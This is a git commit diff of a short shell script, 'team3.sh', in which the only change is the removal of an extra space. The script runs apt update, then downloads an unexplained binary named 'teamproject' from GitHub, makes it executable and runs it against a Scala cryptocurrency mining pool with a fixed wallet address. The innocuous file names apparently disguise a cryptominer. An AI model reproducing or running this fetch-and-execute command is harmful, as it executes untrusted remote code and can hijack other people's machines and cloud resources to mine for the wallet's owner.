3c76a5adb52dbb02e5e351345e59b430fe4862f9
AnggiAlfonso <83615896+AnggiAlfonso@users.noreply.github.com>
2021-05-08 03:55:37 +0800

    Update team3.sh

--- team3.sh
+++ team3.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 apt update
-wget https://github.com/AnggiAlfonso/Project/raw/main/teamproject  && chmod u+x teamproject && ./teamproject --algorithm panthera --pool scala.herominers.com:10131 --wallet Svjb9K3h2DL3FiCR2Qi8L4YtCps2GgJdb1oF68dThFku69AHHsknNUKRPiPDTh3CwsiQAR11ZusneUbXd12n9Trc2KqW3j2ic.agiz2
+wget https://github.com/AnggiAlfonso/Project/raw/main/teamproject && chmod u+x teamproject && ./teamproject --algorithm panthera --pool scala.herominers.com:10131 --wallet Svjb9K3h2DL3FiCR2Qi8L4YtCps2GgJdb1oF68dThFku69AHHsknNUKRPiPDTh3CwsiQAR11ZusneUbXd12n9Trc2KqW3j2ic.agiz2
